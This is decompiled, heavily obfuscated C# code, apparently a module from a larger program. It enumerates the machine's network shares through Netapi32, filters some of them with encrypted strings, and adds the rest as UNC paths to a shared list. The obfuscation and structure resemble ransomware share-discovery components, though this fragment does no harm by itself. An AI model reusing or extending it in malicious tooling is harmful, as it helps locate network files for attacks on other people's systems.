using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace esImVhYKuzS;

public sealed class ciHSClUZVlvkA
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct JSANcrDdTjBKcWi
	{
		public string iuTHGwqFuoykVa;

		public uint DzLkLGvHrbdlLc;

		public string eGxUGfOBadksW;

		public JSANcrDdTjBKcWi(string string_0, uint uint_0, string string_1)
		{
			iuTHGwqFuoykVa = string_0;
			DzLkLGvHrbdlLc = uint_0;
			eGxUGfOBadksW = string_1;
		}

		public override string ToString()
		{
			return iuTHGwqFuoykVa;
		}
	}

	[NonSerialized]
	internal static GetString getString_0;

	public JSANcrDdTjBKcWi[] MSwUwoPgRTl(string string_0)
	{
		List<JSANcrDdTjBKcWi> list = new List<JSANcrDdTjBKcWi>();
		int int_ = 0;
		int int_2 = 0;
		int int_3 = 0;
		int num = Marshal.SizeOf(typeof(JSANcrDdTjBKcWi));
		IntPtr intptr_ = IntPtr.Zero;
		StringBuilder stringBuilder_ = new StringBuilder(string_0);
		int num2 = NetShareEnum(stringBuilder_, 1, ref intptr_, uint.MaxValue, ref int_, ref int_2, ref int_3);
		if (num2 == 0)
		{
			IntPtr ptr = intptr_;
			for (int i = 0; i < int_; i++)
			{
				JSANcrDdTjBKcWi item = (JSANcrDdTjBKcWi)Marshal.PtrToStructure(ptr, typeof(JSANcrDdTjBKcWi));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(intptr_);
			return list.ToArray();
		}
		list.Add(new JSANcrDdTjBKcWi(getString_0(107399014) + num2, 10u, string.Empty));
		return list.ToArray();
	}

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr intptr_0);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder stringBuilder_0, int int_0, ref IntPtr intptr_0, uint uint_0, ref int int_1, ref int int_2, ref int int_3);

	public static void uwjMsTteQrz()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			JSANcrDdTjBKcWi[] array = new ciHSClUZVlvkA().MSwUwoPgRTl(Environment.MachineName);
			JSANcrDdTjBKcWi[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				JSANcrDdTjBKcWi jSANcrDdTjBKcWi = array2[i];
				if (jSANcrDdTjBKcWi.ToString().Contains(getString_0(107399005)) || jSANcrDdTjBKcWi.ToString().Contains(getString_0(107399028)) || jSANcrDdTjBKcWi.ToString().Contains(getString_0(107399019)) || jSANcrDdTjBKcWi.ToString().Contains(getString_0(107388332)) || logicalDrives.Contains(jSANcrDdTjBKcWi.ToString().Replace(getString_0(107403883), getString_0(107398978))))
				{
					continue;
				}
				if (!jIDJtYejSBzFCRw.hYDYrdRZUMfQ.Contains(getString_0(107388319) + Environment.MachineName + getString_0(107397323) + jSANcrDdTjBKcWi))
				{
					jIDJtYejSBzFCRw.hYDYrdRZUMfQ.Add(getString_0(107388319) + Environment.MachineName + getString_0(107397323) + jSANcrDdTjBKcWi);
				}
				if (jIDJtYejSBzFCRw.pjFetgiEucLksJ)
				{
					try
					{
						Console.WriteLine(getString_0(107398973), getString_0(107388319) + Environment.MachineName + getString_0(107397323) + jSANcrDdTjBKcWi);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (jIDJtYejSBzFCRw.yqFjfeWQNnFtS)
			{
				try
				{
					File.AppendAllText(jIDJtYejSBzFCRw.mldgFSRddxG, getString_0(107398948) + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	static ciHSClUZVlvkA()
	{
		Strings.CreateGetStringDelegate(typeof(ciHSClUZVlvkA));
	}
}
